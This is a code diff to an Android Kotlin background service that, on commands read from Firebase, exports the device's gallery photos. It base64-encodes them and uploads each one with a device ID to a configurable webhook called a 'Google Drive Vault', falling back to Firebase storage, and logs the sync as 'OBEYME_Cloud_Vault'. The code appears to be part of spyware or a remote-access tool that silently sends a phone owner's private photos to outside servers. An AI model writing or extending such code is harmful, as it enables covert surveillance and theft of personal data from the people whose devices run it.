@@ -29,6 +29,8 @@ import com.google.firebase.database.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
 import java.io.*
 import java.util.*
 import java.util.concurrent.TimeUnit
@@ -290,6 +292,43 @@ class StreamingService : Service() {
         }
     }
 
+    private fun uploadToGoogleDrive(filename: String, base64Data: String): Map<String, String>? {
+        return try {
+            val webhookUrl = Config.getDriveWebhookUrl(this)
+            if (webhookUrl.isEmpty()) return null
+            
+            val jsonPayload = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("filename", filename)
+                put("base64", base64Data)
+                put("mimeType", "image/jpeg")
+            }.toString()
+            
+            val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
+            val body = jsonPayload.toRequestBody(mediaType)
+            val request = Request.Builder()
+                .url(webhookUrl)
+                .post(body)
+                .build()
+                
+            val response = client.newCall(request).execute()
+            if (response.isSuccessful) {
+                val respStr = response.body?.string() ?: ""
+                val jsonResp = JSONObject(respStr)
+                if (jsonResp.optString("status") == "success") {
+                    mapOf(
+                        "fileId" to jsonResp.optString("fileId"),
+                        "driveUrl" to jsonResp.optString("driveUrl"),
+                        "directUrl" to jsonResp.optString("directUrl")
+                    )
+                } else null
+            } else null
+        } catch (e: Exception) {
+            Timber.e(e, "Drive Upload Error: ${e.message}")
+            null
+        }
+    }
+
     private fun exportGalleryPhotos(snapshot: DataSnapshot) {
         try {
             val mode = snapshot.child("mode").getValue(String::class.java) ?: "latest"
@@ -322,34 +361,47 @@ class StreamingService : Service() {
                     
                     val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                     
-                    // Create lightweight thumbnail base64
-                    var base64Str = ""
+                    var rawBase64 = ""
                     try {
                         contentResolver.openInputStream(contentUri)?.use { input ->
                             val options = BitmapFactory.Options().apply {
-                                inSampleSize = 4 // Downsample for smooth memory & fast Firebase transfer
+                                inSampleSize = 2 // Good balance of quality and speed for Google Drive
                             }
                             val bitmap = BitmapFactory.decodeStream(input, null, options)
                             if (bitmap != null) {
                                 val out = ByteArrayOutputStream()
-                                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
+                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                                 val bytes = out.toByteArray()
-                                base64Str = "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
+                                rawBase64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                 bitmap.recycle()
                             }
                         }
                     } catch (ex: Exception) {
-                        Timber.e(ex, "Error reading photo thumbnail")
+                        Timber.e(ex, "Error reading photo: $name")
                     }
                     
-                    if (base64Str.isNotEmpty()) {
-                        photoList.add(mapOf(
+                    if (rawBase64.isNotEmpty()) {
+                        val photoEntry = mutableMapOf<String, Any>(
                             "id" to id.toString(),
                             "name" to name,
                             "time" to date,
-                            "size" to size,
-                            "base64" to base64Str
-                        ))
+                            "size" to size
+                        )
+
+                        // 1. Upload to Google Drive Vault
+                        val driveRes = uploadToGoogleDrive(name, rawBase64)
+                        if (driveRes != null) {
+                            photoEntry["fileId"] = driveRes["fileId"] ?: ""
+                            photoEntry["driveUrl"] = driveRes["driveUrl"] ?: ""
+                            photoEntry["directUrl"] = driveRes["directUrl"] ?: ""
+                            photoEntry["provider"] = "google_drive"
+                        } else {
+                            // Fallback to direct Firebase Base64
+                            photoEntry["base64"] = "data:image/jpeg;base64,$rawBase64"
+                            photoEntry["provider"] = "firebase"
+                        }
+
+                        photoList.add(photoEntry)
                         processed++
                     }
                 }
@@ -360,6 +412,12 @@ class StreamingService : Service() {
             } else {
                 deviceRef?.child("media/recent")?.setValue(photoList)
             }
+
+            // Also post notification log to Firebase logs
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "☁️ [GOOGLE DRIVE VAULT] Synced $processed photos to Google Drive (OBEYME_Cloud_Vault)",
+                "time" to ServerValue.TIMESTAMP
+            ))
         } catch (e: Exception) {
             Timber.e(e, "Error exporting gallery photos")
         }
